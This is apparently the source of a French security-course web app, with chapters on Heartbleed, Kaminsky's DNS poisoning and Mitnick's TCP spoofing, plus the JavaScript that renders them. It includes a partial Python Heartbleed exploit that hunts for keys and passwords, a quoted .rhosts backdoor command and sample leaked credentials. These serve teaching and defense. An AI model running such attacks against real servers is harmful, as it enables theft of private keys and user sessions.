simplifié)</div>\n<pre\">/* Code VULNÉRABLE dans OpenSSL 1.0.1 à 1.0.1f */\n\nint dtls1_process_heartbeat(SSL *s) {\n    unsigned char *p = &s->s3->rrec.data[0]; // Début du message\n    unsigned short hbtype;\n    unsigned int payload_length;\n    \n    /* Lire le type et la longueur du heartbeat */\n    hbtype         = *p++;\n    n2s(p, payload_length); // payload_length = ce que LE CLIENT DIT\n    \n    /* ====== LE BUG EST ICI ====== */\n    /* Il manque cette vérification critique :\n       if (1 + 2 + payload_length + 16 > s->s3->rrec.length) {\n           return 0; // REJETER si la longueur déclarée est trop grande\n       }\n    */\n    /* ============================  */\n    \n    unsigned char *pl = p; // pl pointe vers le début du payload\n    \n    // Allouer un buffer de réponse\n    unsigned char *buffer = OPENSSL_malloc(1 + 2 + payload_length + padding);\n    unsigned char *bp     = buffer;\n    \n    /* Construire la réponse HeartbeatResponse */\n    *bp++ = TLS1_HB_RESPONSE;   // Type = réponse\n    s2n(payload_length, bp);    // Longueur (celle déclarée par le client !)\n    \n    /* COPIER payload_length octets depuis pl... */\n    /* Mais si payload_length=65535 et le payload réel = 1 octet... */\n    /* ON LIT 65534 OCTETS AU-DELÀ DU PAYLOAD EN MÉMOIRE ! */\n    memcpy(bp, pl, payload_length);  // ← FUITE MÉMOIRE\n    \n    /* Envoyer la réponse au client */\n    ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload_length + padding);\n    return 0;\n}</pre></div>\n\n<div class=\"code-block\"><div class=\"code-label\">Correctif — OpenSSL 1.0.1g (7 avril 2014)</div>\n<pre\">/* Code CORRIGÉ dans OpenSSL 1.0.1g */\nint dtls1_process_heartbeat(SSL *s) {\n    /* ... lecture du message ... */\n    \n    /* VÉRIFICATION AJOUTÉE : la longueur déclarée est-elle réaliste ? */\n    if (1 + 2 + payload_length + 16 > s->s3->rrec.length) {\n        /* Longueur déclarée > taille réelle du message → REJETER */\n        return 0;\n    }\n    \n    /* Si on arrive ici, la longueur est légitime → continuer normalement */\n    memcpy(bp, pl, payload_length); // OK, longueur vérifiée\n    /* ... */\n}\n/* Un simple \"if\" manquant → 500 000 serveurs vulnérables pendant 2 ans */</pre></div>\n"},
    {id:"s20_exp",short:"20.3 Exploitation",title:"20.3 Exploitation — Comment lire la mémoire du serveur",content:"\n<div class=\"prose\">\n<p>Un attaquant exploite Heartbleed en envoyant un HeartbeatRequest avec :</p>\n<ul>\n<li><strong>Longueur déclarée = 65535 (0xFFFF)</strong> — la valeur maximale sur 16 bits</li>\n<li><strong>Payload réel = 1 octet</strong> — pratiquement vide</li>\n</ul>\n<p>Le serveur répond avec un HeartbeatResponse contenant 65535 octets — dont 65534 octets récupérés depuis sa mémoire process !\n\n<h3 class=\"sub\">Structure du paquet malveillant</h3>\n</div>\n<div class=\"diagram\">\n<div class=\"diagram-title\">Comparaison — Requête légitime vs requête malveillante</div>\n<div class=\"mem-diagram\">\n<span class=\"mem-ok\">REQUÊTE LÉGITIME :</span>\n<span class=\"mem-ok\">TLS Record : Type=0x18 | Ver=0x0303 | Len=0x0007 (7 octets)</span>\n<span class=\"mem-ok\">Heartbeat  : Type=0x01 | PayloadLen=0x0003 | \"ABC\" | Padding</span>\n<span class=\"mem-ok\">Réponse    : 3 octets → \"ABC\" (OK, correspondance parfaite)</span>\n\n<span class=\"mem-neutral\"> </span>\n<span class=\"mem-leak\">REQUÊTE MALVEILLANTE (Heartbleed) :</span>\n<span class=\"mem-leak\">TLS Record : Type=0x18 | Ver=0x0303 | Len=0x0003 (3 octets seulement !)</span>\n<span class=\"mem-leak\">Heartbeat  : Type=0x01 | PayloadLen=0xFFFF (65535) | \"X\" (1 octet)</span>\n<span class=\"mem-leak\">Réponse    : 65535 octets → \"X\" + 65534 octets de la mémoire RAM !</span>\n<span class=\"mem-leak\">           Ces 65534 octets peuvent contenir la clé privée SSL !</span></div></div>\n<div class=\"code-block\"><div class=\"code-label\">Simulation Heartbleed avec socket Python pur</div>\n<pre\">import socket, struct, codecs\n\n# Construction du message TLS Heartbeat malveillant\ndef build_heartbleed_request():\n    heartbeat_msg = bytearray([\n        0x01,        # Type : HeartbeatRequest\n        0xFF, 0xFF,  # Longueur DÉCLARÉE : 65535 (MENSONGE !)\n        0x00,        # Payload réel : 1 octet nul\n    ])\n    # En-tête TLS Record :\n    tls_record = bytearray([\n        0x18,        # Content Type : Heartbeat (24)\n        0x03, 0x02,  # Version : TLS 1.1 (pour compatibilité)\n    ]) + struct.pack(\">H\", len(heartbeat_msg)) + heartbeat_msg\n    return bytes(tls_record)\n\ndef exploit_heartbleed(host, port=443):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((host, port))\n    \n    # Étape 1 : Envoyer ClientHello pour initier TLS\n    client_hello = build_client_hello()  # TLS handshake normal\n    s.send(client_hello)\n    receive_server_hello(s)              # Attendre ServerHello\n    \n    # Étape 2 : Envoyer le heartbeat malveillant\n    print(f\"[*] Envoi du heartbeat malveillant vers {host}:{port}\")\n    s.send(build_heartbleed_request())\n    \n    # Étape 3 : Lire la réponse (contient la mémoire du serveur !)\n    response = recvall(s, 65535)\n    \n    if response:\n        print(f\"[+] Réponse reçue : {len(response)} octets de mémoire RAM du serveur !\")\n        # Chercher des informations sensibles dans les données\n        readable = [chr(b) if 32 <= b < 127 else '.' for b in response]\n        chunks = [''.join(readable[i:i+64]) for i in range(0, len(readable), 64)]\n        for chunk in chunks:\n            if any(kw in chunk for kw in ['PRIVATE', 'RSA', 'password', 'session', 'cookie']):\n                print(f\"[!] DONNES SENSIBLES POTENTIELLES : {chunk}\")\n    else:\n        print(\"[-] Pas de réponse (serveur patché ou non vulnérable)\")\n    s.close()\n\n# Test :\n# exploit_heartbleed(\"vulnerable-server.example.com\")</pre></div>\n\n<div class=\"info-box danger\"><div class=\"ib-title\">Ce qu'on peut réellement trouver en mémoire</div>\n<div class=\"mem-diagram\">\nExemple de dump mémoire Heartbleed (extrait réel) :\n\n.<span class=\"mem-leak\">PRIVATE KEY-----\nMIIEowIBAAKCAQEA...</span>              ← Clé privée RSA !\n...<span class=\"mem-leak\">Authorization: Basic dXNlcjpwYXNzd29yZA==</span>..  ← Credentials encodés base64\n...<span class=\"mem-leak\">Cookie: session_id=a3b8d1b6f...</span>            ← Cookie de session !\n...<span class=\"mem-leak\">password=5ecret_P4ssw0rd&submit=login</span>         ← Mot de passe en clair !\n</div></div>\n"},
    {id:"s20_def",short:"20.4 Défense + Leçons",title:"20.4 Défense, Correction et Leçons",content:"\n<div class=\"prose\">\n<h3 class=\"sub\">Actions immédiates requises en 2014</h3>\n<ol>\n<li><strong>Mettre à jour OpenSSL</strong> vers 1.0.1g (ou désactiver l'extension Heartbeat à la compilation avec <code>-DOPENSSL_NO_HEARTBEATS</code>)</li>\n<li><strong>Révoquer TOUS les certificats TLS</strong> du serveur (la clé privée peut avoir été volée)</li>\n<li><strong>Générer de nouvelles paires de clés</strong> et demander un nouveau certificat</li>\n<li><strong>Invalider toutes les sessions utilisateur</strong> actives (cookies de session potentiellement volés)</li>\n<li><strong>Forcer le changement de mot de passe</strong> pour tous les utilisateurs</li>\n</ol>\n</div>\n<div class=\"code-block\"><div class=\"code-label\">Vérifier si un système est vulnérable</div>\n<pre\"># Vérifier la version d'OpenSSL :\nopenssl version\n# OpenSSL 1.0.1f ← VULNÉRABLE\n# OpenSSL 1.0.1g ← PATCHÉ\n# OpenSSL 1.0.2  ← OK\n\n# Tester à distance avec Nmap :\nnmap --script ssl-heartbleed -p 443 target.example.com\n\n# Ou avec un script Python :\npython heartbleed_test.py target.example.com 443\n\n# Vérifier TOUTES les instances d'OpenSSL sur le système :\ndpkg --list | grep libssl\n# Mettre à jour :\nsudo apt-get update && sudo apt-get install --only-upgrade libssl1.0.0\nsudo service nginx restart   # Redémarrer IMPÉRATIVEMENT</pre></div>\n\n<div class=\"prose\">\n<h3 class=\"sub\">Leçons fondamentales</h3>\n</div>\n<table class=\"dt\">\n<tr><th>Leçon</th><th>Explication</th></tr>\n<tr><td>Ne jamais faire confiance à une longueur déclarée</td><td>Toujours valider les entrées : la longueur reçue d'un tiers ne doit jamais dicter la quantité de mémoire à lire/copier</td></tr>\n<tr><td>Utiliser des outils de défense mémoire</td><td>Valgrind, AddressSanitizer (-fsanitize=address) auraient détecté la lecture hors limites</td></tr>\n<tr><td>Defense in depth</td><td>Même avec la fuite mémoire, Perfect Forward Secrecy (DHE/ECDHE) aurait limité les dégâts</td></tr>\n<tr><td>Open Source n'est pas toujours plus sûr</td><td>OpenSSL est open source depuis 1998, des milliers de développeurs auraient pu voir ce bug en 2 ans</td></tr>\n<tr><td>La cryptographie ne suffit pas</td><td>TLS chiffrait tout — mais la fuite était dans l'implémentation, pas dans la cryptographie elle-même</td></tr>\n</table>\n\n<div class=\"info-box ok\"><div class=\"ib-title\">Perfect Forward Secrecy (PFS) — Une limite partielle</div>\n<p>Si le serveur utilisait <strong>DHE (Diffie-Hellman Ephemeral)</strong> ou <strong>ECDHE</strong> pour l'échange de clés TLS, la fuite de la clé privée serveur ne permettrait PAS de déchiffrer les sessions passées enregistrées. En effet, avec PFS, chaque session génère une clé symétrique éphémère qui n'est jamais stockée sur le disque. Cependant, la fuite de mots de passe et de cookies restait possible.</p>\n<p>Activer PFS en Apache : <code>SSLCipherSuite ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384</code></p></div>\n"}
]};

<h3 class="sub">Comment Dan Kaminsky a découvert l'attaque ultime (Steve Friedl, 2008)</h3>
<div class="prose">
<p>Avant Kaminsky, les chercheurs connaissaient les attaques DNS basiques : empoisonner <strong>un seul enregistrement A</strong> d'un sous-domaine unique. L'impact était limité — une seule entrée du cache était corrompue.</p>
<p>Le génie de Kaminsky fut de réaliser qu'au lieu de cibler l'enregistrement final (l'IP du site), on pouvait monter d'un niveau et <strong>détourner les enregistrements NS (Name Server) — l'autorité de toute la zone</strong>.</p>
</div>
<div class="info-box danger"><div class="ib-title">La différence cruciale — Poisonner l'autorité, pas juste la réponse</div>
<table class="dt">

<tr><td>Cible : enregistrement A de<br><code>www.bankofsteve.com</code></td><td>Cible : enregistrement NS (autorité) de<br><code>bankofsteve.com</code> tout entier</td></tr>
<tr><td>Impact : 1 site redirigé</td><td>Impact : <strong>TOUT le domaine</strong> bankofsteve.com<br>+ tous ses sous-domaines (www, mail, ftp...)</td></tr>
<tr><td>Durée : TTL de la réponse</td><td>Durée : TTL très élevé mis par l'attaquant</td></tr>
<tr><td>Difficile à répéter</td><td>Rejouer facilement depuis la même base</td></tr>
</table></div>
<div class="prose">
<h4 class="sub2">Pourquoi c'est si dévastateur</h4>
<p>En poisonnant les enregistrements NS, l'attaquant configure son propre serveur DNS comme <strong>serveur autoritaire</strong> pour tout le domaine cible. Le résolveur corrompu <em>croyant</em> désormais que c'est le vrai serveur DNS de la banque :</p>
<ul>
<li>Renvoie l'IP de l'attaquant pour <strong>tout</strong> sous-domaine interrogé</li>
<li>Renvoie des enregistrements MX falsifiés → <strong>emails interceptés</strong></li>
<li>Peut rester empoisonné des heures ou des jours (TTL long)</li>
</ul>
</div>

<div class="info-box warn"><div class="ib-title">La théorie des probabilités — Pourquoi en 10 secondes ?</div>

<p>Si l'attaquant envoie 50 faux paquets par requête, la probabilité de succès par tentative est de 50/65536 ≈ 0,076%. Mais en répétant avec de nouveaux sous-domaines aléatoires à très grande vitesse, le succès arrive statistiquement en <strong>moins de 10 secondes</strong>.</p>
<p>Avec la <strong>randomisation du port source</strong> (post-Kaminsky), l'espace de recherche passe à 65536 × 65536 = 4 milliards → attaque pratiquement impossible sans interception physique.</p>
</div></div>

<div class="info-box tip"><div class="ib-title">Prise de contrôle du TLD — Aller encore plus haut</div>
<p>La même technique peut cibler le TLD <code>.com</code> lui-même ! En poisonnant les enregistrements NS de <code>.com</code>, un attaquant peut potentiellement rediriger TOUS les noms en <code>.com</code> vers ses propres serveurs. C'est théoriquement possible mais nécessite des ressources massives pour servir tout le trafic généré.</p></div>
`;

}

    <p>Kevin Mitnick est l'un des hackers les plus célèbres de l'histoire. Dans les années 1980-90, il a pénétré les systèmes de Pacific Bell, Nokia, Motorola, Sun Microsystems et le Pentagone. Arrêté en 1995 après une traque de 3 ans par le FBI, il a passé 5 ans en prison. Après sa libération, il est devenu consultant en sécurité et auteur de plusieurs livres sur l'art du piratage.</p>

<div class="info-box danger"><div class="ib-title">Pourquoi Mitnick est pertinent dans le contexte TCP/IP</div>

<h3 class="sub">L'Attaque Shimomura (Noël 1994) — TCP Spoofing en pratique</h3>
<div class="prose">
<p>L'attaque de Mitnick contre Shimomura est un classique qui combine plusieurs techniques vues dans ce cours :</p>
<ol>

<li><strong>TCP Sequence Prediction</strong> : Il envoie des paquets SYN au serveur cible (<code>ariel</code>) puis observe les numéros de séquence dans les SYN-ACK pour prédire le prochain ISN (Initial Sequence Number)</li>
<li><strong>IP Spoofing + Hijacking</strong> : Il envoie des paquets forgés avec l'IP source de <code>x-terminal</code> (la machine de confiance muette), complétant le handshake avec le numéro de séquence prédit</li>
<li><strong>Backdoor</strong> : Il profite de la connexion TCP spoofée pour ajouter son IP dans <code>~root/.rhosts</code> sur le serveur cible → accès root permanent</li>
</ol>
</div>

<div class="diagram">
<div class="diagram-title">Chronologie de l'attaque Shimomura — 25 décembre 1994</div>
<div class="mem-diagram">
<span class="mem-ok">14:09:32 — Mitnick envoie 20 SYN vers x-terminal:513 → SYN FLOOD (le rend muet)</span>
<span class="mem-neutral">14:10:13 — Test de prédiction : 8 connexions SYN vers ariel.sdsc.edu:513</span>
<span class="mem-neutral">          → Observation des ISN : incréments de 128000 (réguliers !)</span>
<span class="mem-leak">14:10:16 — Spoofed SYN : IP_src=x-terminal, dst=ariel, dst_port=514</span>
<span class="mem-leak">          → ariel répond SYN-ACK vers x-terminal (qui est muet → pas de RST)</span>
<span class="mem-leak">14:10:16 — Spoofed ACK : ack=ISN_ariel+1 (valeur prédite !)</span>
<span class="mem-leak">          → Connexion TCP établie sans jamais voir le SYN-ACK !</span>
<span class="mem-leak">14:10:16 — Commande injectée : "echo '+ +' >> /.rhosts"</span>
<span class="mem-ok">→ Accès root sur ariel.sdsc.edu depuis n'importe quelle IP</span></div></div>

<div class="info-box note"><div class="ib-title">Leçon de sécurité — Pourquoi cela marchait en 1994</div>
<ul class="info-box"><li>Les ISN (Initial Sequence Numbers) TCP n'étaient PAS aléatoires — ils suivaient un pattern prévisible</li>
<li>Les relations de confiance rsh/rlogin utilisaient uniquement l'IP source comme authentification</li>
<li>Pas de chiffrement → une fois la connexion établie, toutes les commandes étaient visibles en clair</li>
<li>Aujourd'hui : les ISN sont aléatoires (RFC 6528), SSH remplace rsh, TLS chiffre tout</li>

<li><em>"Ghost in the Wires"</em> (2011) — Son autobiographie de fugitif recherché par le FBI</li>
</ul></div>
`;

function buildChapterHTML(ch) {
    let html = '<div class="chapter-tag">' + ch.icon + ' Chapitre ' + ch.num + '</div>';
    html += '<h1 class="chapter-title">' + ch.title + '</h1>';
    html += '<p class="chapter-desc">' + ch.desc + '</p>';
    html += '<div class="section-nav" id="secnav_' + ch.id + '">';
    ch.sections.forEach(s => {
        html += '<button class="sec-btn" data-sec="' + s.id + '">' + s.short + '</button>';
    });
    html += '</div>';
    ch.sections.forEach(s => {
        const readKey = ch.id + '|' + s.id;
        const isDone  = readSet.has(readKey);
        html += '<div class="section-block" id="sec_' + s.id + '">';
        html += '<h2 class="section-title">' + s.title + '</h2>';
        html += s.content;
        html += '<button class="read-btn' + (isDone ? ' done' : '') + '" data-sec="' + s.id + '">' +
                (isDone ? '\u2705 Lu' : '\u25cb Marquer comme lu') + '</button>';
        html += '</div>';
    });
    return html;
}

                label.appendChild(btn);
            }
        });
        // Make images clickable → lightbox
        el.querySelectorAll('.img-card img').forEach(img => {
            img.addEventListener('click', () => {
                openImg(img.src, img.alt);
            });
        });
    }
    document.querySelectorAll('.content').forEach(p => p.classList.remove('active'));
    el.classList.add('active');
    const target = currentSecId && document.getElementById('sec_' + currentSecId)
                   ? currentSecId : ch.sections[0].id;
    selectSection(ch.id, target);
}

function selectChapter(chId) {
    currentChId = chId;
    currentSecId = '';
    const ch = chapters.find(c => c.id === chId);
    if(!ch) return;
    renderChapterList(chapters);
    renderChapter(ch);
    updateProgress();
    if(window.innerWidth <= 768)
        document.getElementById('sidebar').classList.remove('mobile-open');
}

function selectSection(chId, secId) {
    currentSecId = secId;
    const nav = document.getElementById('secnav_' + chId);
    if(nav) nav.querySelectorAll('.sec-btn').forEach(btn =>
        btn.classList.toggle('active', btn.dataset.sec === secId));
    const ch = chapters.find(c => c.id === chId);
    if(!ch) return;
    ch.sections.forEach(s => {
        const el = document.getElementById('sec_' + s.id);
        if(el) el.classList.toggle('active', s.id === secId);
    });
    document.querySelector('.main').scrollTo({top:0, behavior:'smooth'});
}

function toggleRead(chId, secId, btn) {
    const key = chId + '|' + secId;
    if(readSet.has(key)) {
        readSet.delete(key);
        btn.innerHTML = '\u25cb Marquer comme lu';
        btn.classList.remove('done');
    } else {
        readSet.add(key);
        btn.innerHTML = '\u2705 Lu';
        btn.classList.add('done');
    }
    localStorage.setItem('secnet_read', JSON.stringify([...readSet]));
    updateProgress();
}

function updateProgress() {
    const total = chapters.reduce((a,c) => a + c.sections.length, 0);
    document.getElementById('progressText').textContent = readSet.size + '/' + total;
}

function toggleSidebar() {
    const sb = document.getElementById('sidebar');
    if(window.innerWidth <= 768) {
        sb.classList.toggle('mobile-open');
    } else {
        sidebarOpen = !sidebarOpen;
        sb.classList.toggle('collapsed', !sidebarOpen);
    }
}

function onSearch(q) {
    q = q.toLowerCase();
    const filtered = q ? chapters.filter(c =>
        c.title.toLowerCase().includes(q) ||
        c.desc.toLowerCase().includes(q) ||
        c.sections.some(s => s.title.toLowerCase().includes(q) ||
                              s.content.toLowerCase().includes(q))
    ) : chapters;
    renderChapterList(filtered);
    document.getElementById('noResult').style.display = filtered.length === 0 ? 'block' : 'none';
}

// Init
renderChapterList(chapters);
// Override selectChapter to inject images after render
const _origSelect = selectChapter;
window.selectChapter = function(chId) {
  _origSelect(chId);
  setTimeout(() => { injectImages(); enrichKaminskySection(); addMitnickSection(); }, 50);
};
selectChapter('ch15');
updateProgress();
</script>
